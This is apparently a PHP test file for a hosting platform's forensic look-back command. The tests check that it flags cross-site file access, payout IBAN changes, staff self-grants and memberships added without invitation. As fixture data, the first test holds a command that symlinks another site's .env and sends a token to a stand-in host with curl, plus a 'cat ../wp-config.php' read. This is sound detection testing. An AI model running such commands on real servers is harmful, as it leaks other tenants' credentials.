    $link = flbOperation($site, 'service.action', ['action' => 'command.run', 'service_id' => $site->id, 'command' => 'ln -s /www/wwwroot/other.cz/.env leak.txt && curl -s https://example.test/?token=TOPSECRET', 'cwd' => '', 'timeout' => 60], [], $at);
    $climb = flbOperation($site, 'service.action', ['action' => 'command.run', 'service_id' => $site->id, 'command' => 'cat ../other.cz/wp-config.php', 'cwd' => 'public', 'timeout' => 60], [], $at->addMinute(), Operation::FAILED);
    flbOperation($site, 'service.action', ['action' => 'command.run', 'service_id' => $site->id, 'command' => 'php artisan cache:clear', 'cwd' => 'app', 'timeout' => 60], [], $at->addMinutes(2));

    [$code, $report] = flbRun(['--source' => ['aapanel_outside_root']]);
    $source = flbSource($report, 'aapanel_outside_root');
    $byOperation = collect($source['hits'])->keyBy('operation_id');

    expect($code)->toBe(1)
        ->and($source['hits'])->toHaveCount(2)
        ->and($byOperation[$link->id])->toMatchArray(['kind' => 'command_reaches_outside_root', 'confidence' => 'possible', 'action' => 'command.run', 'symlink' => true])
        ->and($byOperation[$link->id]['paths'])->toContain('/www/wwwroot/other.cz/.env')
        ->and($byOperation[$climb->id])->toMatchArray(['kind' => 'command_reaches_outside_root', 'climbs' => true, 'state' => 'FAILED'])
        ->and(implode(' ', $source['unknowns']))->toContain('operator:aapanel:tenancy')->toContain($site->id);
    expect(json_encode($report))->not->toContain('TOPSECRET');
});

it('reports the IBAN of a rejected request and a first payout it cannot compare (P2, review round 1)', function () {
    [, $partnerOrg] = $this->customerWithOrganization();
    $insider = flbUser('ucetni2@partner.test');
    DB::table('partners')->insert(['id' => 'ptn_flb2', 'organization_id' => $partnerOrg->id, 'code' => 'FLB2', 'model' => 'share', 'tier' => 'bronze', 'rate_pct' => 15, 'currency' => 'CZK', 'iban' => 'CZ5503000000000123456789', 'state' => 'active', 'created_at' => now(), 'updated_at' => now()]);
    $at = CarbonImmutable::parse('2026-07-01 10:00:00');
    $payout = function (string $id, string $number, string $iban, string $state, CarbonImmutable $when) {
        DB::table('partner_payouts')->insert(['id' => $id, 'partner_id' => 'ptn_flb2', 'number' => $number, 'amount_minor' => 100000, 'currency' => 'CZK', 'method' => 'bank_transfer', 'iban' => $iban, 'state' => $state, 'self_billing' => '[]', 'requested_at' => $when, 'paid_at' => $state === 'paid' ? $when->addDay() : null, 'created_at' => $when, 'updated_at' => $when]);
    };
    $payout('ppo_flb2_first', 'PO-2026-07', 'CZ6508000000192000145399', 'paid', $at);                           // nothing earlier to compare with
    $payout('ppo_flb2_rejected', 'PO-2026-08', 'CZ5503000000000123456789', 'rejected', $at->addMonth());         // rejected, yet partners.iban kept it
    $payout('ppo_flb2_auto', 'PO-2026-09', 'CZ5503000000000123456789', 'requested', $at->addMonths(2));         // the automatic payout followed it
    foreach (['ppo_flb2_first' => 'paid', 'ppo_flb2_auto' => 'allocated'] as $payoutId => $state) { // fully covered: no amount hit
        DB::table('partner_commissions')->insert(['id' => 'pcm_'.$payoutId, 'partner_id' => 'ptn_flb2', 'organization_id' => $partnerOrg->id, 'period' => '2026-07', 'kind' => 'share', 'base_minor' => 700000, 'rate_pct' => 15, 'amount_minor' => 100000, 'currency' => 'CZK', 'state' => $state, 'payout_id' => $payoutId, 'created_at' => now(), 'updated_at' => now()]);
    }
    flbAudit($at->addMonth(), $this->contextFor($insider, $partnerOrg), 'partner.payout.request', ['number' => 'PO-2026-08'], 'partner_payout', 'ppo_flb2_rejected');

    [$code, $report] = flbRun(['--source' => ['partner_payouts']]);
    $source = flbSource($report, 'partner_payouts');
    $byPayout = collect($source['hits'])->keyBy('payout_id');

    expect($code)->toBe(1)
        ->and($source['hits'])->toHaveCount(2) // a rejected payout is never an amount hit: its commissions went back
        ->and($byPayout['ppo_flb2_rejected'])->toMatchArray(['kind' => 'payout_iban_changed', 'state' => 'rejected', 'requested_by' => $insider->id, 'requested_by_owner' => false])
        ->and($byPayout['ppo_flb2_auto'])->toMatchArray(['kind' => 'payout_iban_changed', 'state' => 'requested'])
        ->and(implode(' ', $source['unknowns']))->toContain('ppo_flb2_first');
});

it('reads the staff self-grant and reinstatement shortcuts and counts memberships it cannot judge (IF-8, review round 1)', function () {
    [$owner, $own] = $this->customerWithOrganization();
    $staff = $this->staff();
    $at = CarbonImmutable::parse('2026-09-07 15:00:00');
    test()->travelTo($at->subDay());
    app(OrganizationService::class)->attachMember($own, $staff, 'viewer', $this->contextFor($owner, $own), joinedNow: true);
    test()->travelBack();
    $mine = featureWebService($own, 'ispconfig');
    // mayGrant lets staff past self_membership_locked and role_above_own: the attach row names the actor as its own target
    $grant = flbAudit($at, $this->contextFor($staff, $own), 'organization.member.attach', ['user_id' => $staff->id, 'role' => 'org_admin'], 'organization', $own->id);
    // ServiceReinstatement::actorMay answers true for any staff user: a reinstatement asked in their own organization
    $reinstate = flbAudit($at->addHour(), $this->contextFor($staff, $own), 'service.reinstate.requested', ['total_due' => ['minor' => 100, 'currency' => 'CZK']], 'service', $mine->id);
    // a staff user who accepted an invitation in another organization attached themselves too: that is not a self-grant
    [$otherOwner, $invited] = $this->customerWithOrganization();
    DB::table('organization_invitations')->insert(['id' => 'inv_flb_staff', 'organization_id' => $invited->id, 'email' => mb_strtolower((string) $staff->email), 'role_key' => 'developer', 'token_hash' => hash('sha256', 'st'), 'invited_by' => $otherOwner->id, 'expires_at' => $at->addDays(7), 'accepted_at' => $at, 'created_at' => $at, 'updated_at' => $at]);
    flbAudit($at, $this->contextFor($staff, $invited), 'organization.member.attach', ['user_id' => $staff->id, 'role' => 'developer'], 'organization', $invited->id);
    // an organization older than the audit: whether the staff user was a member of it when lifting the hold cannot be told
    [, $ancient] = $this->customerWithOrganization();
    Organization::query()->whereKey($ancient->id)->update(['created_at' => '2020-01-01 00:00:00']);
    flbAudit($at, $this->contextFor($staff, $ancient), 'service.hold.lift', ['lifted' => ['abuse'], 'reason' => 'x'], 'service', 'svc_flb_old');

    [$code, $report] = flbRun(['--source' => ['staff_own_org']]);
    $source = flbSource($report, 'staff_own_org');
    $kinds = collect($source['hits'])->keyBy('kind');

    expect($code)->toBe(1)
        ->and($source['hits'])->toHaveCount(2)
        ->and($kinds['staff_self_grant'])->toMatchArray(['audit_event_id' => $grant, 'user_id' => $staff->id, 'organization_id' => $own->id, 'role' => 'org_admin', 'member_before' => true])
        ->and($kinds['staff_reinstate_own_org'])->toMatchArray(['audit_event_id' => $reinstate, 'user_id' => $staff->id, 'organization_id' => $own->id, 'service_id' => $mine->id])
        ->and(implode(' ', $source['unknowns']))->toContain('1 staff action');
});

// ── review round 2 (TASK-0038): TD-2 and TD-3 were missing, an invitation explained any role, the database was not asked to refuse writes ──

it('finds a person attached to another organization without an invitation, and re-entries after a removal (TD-2, review round 2)', function () {
    [$owner, $org] = $this->customerWithOrganization();
    $admin = flbUser('spravce@firma.test');
    $victim = flbUser('obet@jinde.test');
    $colleague = flbUser('pozvany@firma.test');
    $returner = flbUser('vraceny@firma.test');
    $renamed = flbUser('nova-adresa@firma.test');
    $t0 = CarbonImmutable::parse('2026-09-08 09:00:00');
    DB::table('organization_invitations')->insert(['id' => 'inv_flb_admin', 'organization_id' => $org->id, 'email' => 'spravce@firma.test', 'role_key' => 'org_admin', 'token_hash' => hash('sha256', 'td2a'), 'invited_by' => $owner->id, 'expires_at' => $t0->addDays(7), 'accepted_at' => $t0, 'created_at' => $t0, 'updated_at' => $t0]);
    flbAudit($t0, $this->contextFor($admin, $org), 'organization.member.attach', ['user_id' => $admin->id, 'role' => 'org_admin'], 'organization', $org->id);
    // the exploit: change_role with the user_id of somebody who never was a member — updateOrCreate makes the membership
    $joined = flbAudit($t0->addHour(), $this->contextFor($admin, $org), 'organization.member.attach', ['user_id' => $victim->id, 'role' => 'viewer'], 'organization', $org->id);
    // an ordinary acceptance is not a finding
    DB::table('organization_invitations')->insert(['id' => 'inv_flb_td2', 'organization_id' => $org->id, 'email' => 'pozvany@firma.test', 'role_key' => 'developer', 'token_hash' => hash('sha256', 'td2b'), 'invited_by' => $owner->id, 'expires_at' => $t0->addDays(7), 'accepted_at' => $t0->addHours(2), 'created_at' => $t0, 'updated_at' => $t0]);
    flbAudit($t0->addHours(2), $this->contextFor($colleague, $org), 'organization.member.attach', ['user_id' => $colleague->id, 'role' => 'developer'], 'organization', $org->id);
    // a role change of a member is not an entry
    flbAudit($t0->addHours(3), $this->contextFor($admin, $org), 'organization.member.attach', ['user_id' => $colleague->id, 'role' => 'viewer'], 'organization', $org->id);
    // removed, then brought back by change_role without a new invitation: an entry without consent too
    DB::table('organization_invitations')->insert(['id' => 'inv_flb_ret', 'organization_id' => $org->id, 'email' => 'vraceny@firma.test', 'role_key' => 'developer', 'token_hash' => hash('sha256', 'td2c'), 'invited_by' => $owner->id, 'expires_at' => $t0->addDays(7), 'accepted_at' => $t0, 'created_at' => $t0, 'updated_at' => $t0]);
    flbAudit($t0, $this->contextFor($returner, $org), 'organization.member.attach', ['user_id' => $returner->id, 'role' => 'developer'], 'organization', $org->id);
    flbAudit($t0->addDay(), $this->contextFor($owner, $org), 'organization.member.remove', ['user_id' => $returner->id], 'organization', $org->id);
    $back = flbAudit($t0->addDays(2), $this->contextFor($admin, $org), 'organization.member.attach', ['user_id' => $returner->id, 'role' => 'developer'], 'organization', $org->id);
    // accepted under an address the account no longer carries: the acceptance may be theirs — possible, not confirmed
    DB::table('organization_invitations')->insert(['id' => 'inv_flb_old', 'organization_id' => $org->id, 'email' => 'stara-adresa@firma.test', 'role_key' => 'developer', 'token_hash' => hash('sha256', 'td2d'), 'invited_by' => $owner->id, 'expires_at' => $t0->addDays(7), 'accepted_at' => $t0->addDays(3), 'created_at' => $t0, 'updated_at' => $t0]);
    $renamedRow = flbAudit($t0->addDays(3), $this->contextFor($renamed, $org), 'organization.member.attach', ['user_id' => $renamed->id, 'role' => 'developer'], 'organization', $org->id);
    // an organization older than the audit: an attach of somebody with no recorded past there cannot be judged
    [, $ancient] = $this->customerWithOrganization();
    Organization::query()->whereKey($ancient->id)->update(['created_at' => '2020-01-01 00:00:00']);
    flbAudit($t0, $this->contextFor($admin, $ancient), 'organization.member.attach', ['user_id' => $victim->id, 'role' => 'viewer'], 'organization', $ancient->id);

    [$code, $report] = flbRun(['--source' => ['member_without_invitation']]);
    $source = flbSource($report, 'member_without_invitation');
    $byEvent = collect($source['hits'])->keyBy('audit_event_id');

    expect($code)->toBe(1)
        ->and($source['exploit'])->toBe('TD-2')
        ->and($source['hits'])->toHaveCount(3)
        ->and($byEvent[$joined])->toMatchArray(['kind' => 'member_attached_without_invitation', 'confidence' => 'confirmed', 'organization_id' => $org->id, 'user_id' => $victim->id, 'role' => 'viewer', 'actor_id' => $admin->id, 're_entry' => false])
        ->and($byEvent[$back])->toMatchArray(['kind' => 'member_attached_without_invitation', 'confidence' => 'confirmed', 'user_id' => $returner->id, 're_entry' => true])
        ->and($byEvent[$renamedRow])->toMatchArray(['confidence' => 'possible', 'user_id' => $renamed->id])
        ->and(implode(' ', $source['unknowns']))->toContain('1 attach');
    expect(json_encode($report))->not->toContain('obet@jinde.test')->not->toContain('stara-adresa');
});

it('finds project roles granted past mayGrant: to oneself, or above the granting role (TD-3, review round 2)', function () {
    [$owner, $org] = $this->customerWithOrganization();
    $admin = flbUser('admin@projekt.test');
    $dev = flbUser('vyvojar@projekt.test');
    $other = flbUser('dalsi@projekt.test');
    $t0 = CarbonImmutable::parse('2026-09-09 09:00:00');
    foreach ([[$admin, 'org_admin'], [$dev, 'developer'], [$other, 'viewer']] as [$person, $role]) {
        flbAudit($t0, $this->contextFor($owner, $org), 'organization.member.attach', ['user_id' => $person->id, 'role' => $role], 'organization', $org->id);
    }
    $project = fn (User $actor) => new CommandContext('user', $actor->id, $org->id, 'prj_flb_1', '127.0.0.1', 'pest', 'test-session');
    $self = flbAudit($t0->addHour(), $project($admin), 'project.member.add', ['user_id' => $admin->id, 'role' => 'developer'], 'project', 'prj_flb_1');
    $above = flbAudit($t0->addHours(2), $project($dev), 'project.member.add', ['user_id' => $other->id, 'role' => 'org_admin'], 'project', 'prj_flb_1');
    flbAudit($t0->addHours(3), $project($owner), 'project.member.add', ['user_id' => $dev->id, 'role' => 'developer'], 'project', 'prj_flb_1');   // the owner covers every role
    flbAudit($t0->addHours(4), $project($admin), 'project.member.add', ['user_id' => $other->id, 'role' => 'developer'], 'project', 'prj_flb_1'); // an admin grants what their role covers

    [$code, $report] = flbRun(['--source' => ['project_grant_bypass']]);
    $source = flbSource($report, 'project_grant_bypass');
    $byEvent = collect($source['hits'])->keyBy('audit_event_id');

    expect($code)->toBe(1)
        ->and($source['exploit'])->toBe('TD-3')
        ->and($source['hits'])->toHaveCount(2)
        ->and($byEvent[$self])->toMatchArray(['kind' => 'project_self_grant', 'confidence' => 'confirmed', 'user_id' => $admin->id, 'actor_id' => $admin->id, 'project_id' => 'prj_flb_1', 'role' => 'developer'])
        ->and($byEvent[$above])->toMatchArray(['kind' => 'project_grant_above_own', 'confidence' => 'confirmed', 'user_id' => $other->id, 'actor_id' => $dev->id, 'role' => 'org_admin', 'actor_role' => 'developer'])
        ->and($byEvent[$above]['missing'])->not->toBeEmpty();
});

it('explains a staff attach only by an event of the same role: invite as viewer, then raise oneself (IF-8, review round 2)', function () {
    [$owner, $org] = $this->customerWithOrganization();
    $staff = $this->staff();
    $at = CarbonImmutable::parse('2026-09-10 11:00:00');
    DB::table('organization_invitations')->insert(['id' => 'inv_flb_raise', 'organization_id' => $org->id, 'email' => mb_strtolower((string) $staff->email), 'role_key' => 'viewer', 'token_hash' => hash('sha256', 'raise'), 'invited_by' => $owner->id, 'expires_at' => $at->addDays(7), 'accepted_at' => $at, 'created_at' => $at, 'updated_at' => $at]);
    flbAudit($at, $this->contextFor($staff, $org), 'organization.member.attach', ['user_id' => $staff->id, 'role' => 'viewer'], 'organization', $org->id); // the acceptance itself
    $raise = flbAudit($at->addSeconds(30), $this->contextFor($staff, $org), 'organization.member.attach', ['user_id' => $staff->id, 'role' => 'org_admin'], 'organization', $org->id);

    [$code, $report] = flbRun(['--source' => ['staff_own_org']]);
    $source = flbSource($report, 'staff_own_org');

    expect($code)->toBe(1)
        ->and($source['hits'])->toHaveCount(1)
        ->and($source['hits'][0])->toMatchArray(['kind' => 'staff_self_grant', 'audit_event_id' => $raise, 'role' => 'org_admin', 'member_before' => true]);
});

it('asks the database itself to refuse writes for the length of the look-back (review round 2)', function () {
    $statements = [];
    DB::listen(function ($query) use (&$statements) {
        $statements[] = $query->sql;
    });

    Artisan::call('onhost:forensics:lookback', ['--source' => ['token_cross_org']]);

    $guard = DB::getDriverName() === 'pgsql' ? 'SET TRANSACTION READ ONLY' : 'PRAGMA query_only = ON';
    expect($statements[0] ?? null)->toBe($guard); // the first statement of the run, before any read
});
